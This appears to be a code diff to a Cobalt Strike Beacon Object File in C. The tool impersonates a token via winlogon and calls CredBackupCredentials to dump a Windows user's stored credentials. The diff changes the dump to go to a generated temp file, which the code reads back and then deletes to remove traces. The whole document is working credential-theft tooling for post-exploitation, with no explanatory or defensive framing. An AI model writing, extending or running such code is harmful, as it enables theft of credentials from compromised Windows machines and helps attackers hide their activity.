@@ -3,6 +3,7 @@
 #include <tlhelp32.h>
 #include "beacon.h"
 #define MAX_LENGTH 256
+#define MAX_PATH 260
 
 WINBASEAPI WINBOOL WINAPI KERNEL32$FileTimeToSystemTime(const FILETIME *lpFileTime, LPSYSTEMTIME lpSystemTime);
 WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD, WINBOOL, DWORD);
@@ -12,8 +13,11 @@ WINADVAPI WINBOOL WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR, LPCSTR, PLUID);
 WINADVAPI WINBOOL WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, WINBOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
 WINADVAPI BOOL WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE);
 WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+WINBASEAPI WINBOOL WINAPI KERNEL32$DeleteFileW(LPCWSTR lpFileName);
 WINBASEAPI WINBOOL WINAPI KERNEL32$GetFileSize(HANDLE, LPDWORD);
 WINBASEAPI WINBOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
+WINBASEAPI UINT WINAPI KERNEL32$GetTempFileNameW(LPCWSTR lpPathName, LPCWSTR lpPrefixString, UINT uUnique, LPWSTR lpTempFileName);
+WINBASEAPI DWORD WINAPI KERNEL32$GetTempPathW(DWORD nBufferLength, LPWSTR lpBuffer);
 DECLSPEC_IMPORT HGLOBAL WINAPI KERNEL32$GlobalAlloc(UINT, SIZE_T);
 DECLSPEC_IMPORT HGLOBAL WINAPI KERNEL32$GlobalFree(HGLOBAL);
 DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE);
@@ -100,7 +104,7 @@ void go(char *args, int len)
     // Not implemented in our loader yet
     // if (!BeaconIsAdmin())
     // {
-    //     BeaconPrintf(CALLBACK_OUTPUT, "You must be a admin for this to work");
+    //     BeaconPrintf(CALLBACK_ERROR, "You must be a admin for this to work");
     //     return;
     // }
     datap parser;
@@ -116,8 +120,10 @@ void go(char *args, int len)
     PCRED_BACKUP backupData;
     CHAR *backupFile = NULL;
     wchar_t *dumpfilepath;
+    WCHAR szTempFileName[MAX_PATH];
+    WCHAR lpTempPathBuffer[MAX_PATH];
+    DWORD backupStatus = 0;
 
-    dumpfilepath = (wchar_t *)BeaconDataExtract(&parser, NULL);
     userpid = BeaconDataInt(&parser);
 
     DWORD PID = FindWinLogonPid();
@@ -186,13 +192,28 @@ void go(char *args, int len)
         goto cleanup;
     }
 
-    status = ADVAPI32$CredBackupCredentials(userToken, (LPCWSTR)dumpfilepath, NULL, 0, 0);
-    if (status == FALSE)
+    DWORD dwRetval = KERNEL32$GetTempPathW(MAX_PATH, lpTempPathBuffer);
+    if (dwRetval > MAX_PATH || (dwRetval == 0))
+    {
+        BeaconPrintf(CALLBACK_ERROR, "GetTempPathA failed with error code %d\n", KERNEL32$GetLastError());
+        goto cleanup;
+    }
+
+    DWORD uRetval = KERNEL32$GetTempFileNameW(lpTempPathBuffer, L"bkp", 0, szTempFileName);
+    if (uRetval == 0)
+    {
+        BeaconPrintf(CALLBACK_ERROR, "GetTempFileNameA failed with error code %d\n", KERNEL32$GetLastError());
+        goto cleanup;
+    }
+
+    backupStatus = ADVAPI32$CredBackupCredentials(userToken, (LPCWSTR)szTempFileName, NULL, 0, 0);
+    if (backupStatus == FALSE)
     {
         BeaconPrintf(CALLBACK_ERROR, "ADVAPI32$CredBackupCredentials Failed with error code %d\n", KERNEL32$GetLastError());
         goto cleanup;
     }
-    hFile = KERNEL32$CreateFileW((LPCWSTR)dumpfilepath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+    hFile = KERNEL32$CreateFileW((LPCWSTR)szTempFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == NULL)
     {
         BeaconPrintf(CALLBACK_ERROR, "CreateFile Failed with error code %d\n", KERNEL32$GetLastError());
@@ -251,6 +272,7 @@ void go(char *args, int len)
             }
         }
     }
+    goto cleanup;
 
 cleanup:
     if (hProc)
@@ -280,5 +302,16 @@ cleanup:
     if (backupFile)
     {
         KERNEL32$GlobalFree(backupFile);
+    }
+    if (backupStatus != 0)
+    {
+        if (KERNEL32$DeleteFileW((LPCWSTR)szTempFileName) == 0)
+        {
+            BeaconPrintf(CALLBACK_ERROR, "DeleteFileW failed with error %d", KERNEL32$GetLastError());
+        }
+        else
+        {
+            BeaconPrintf(CALLBACK_OUTPUT, "\n\nCleaned up temporary file %S\n", (LPCWSTR)szTempFileName);
+        }
     }
 }
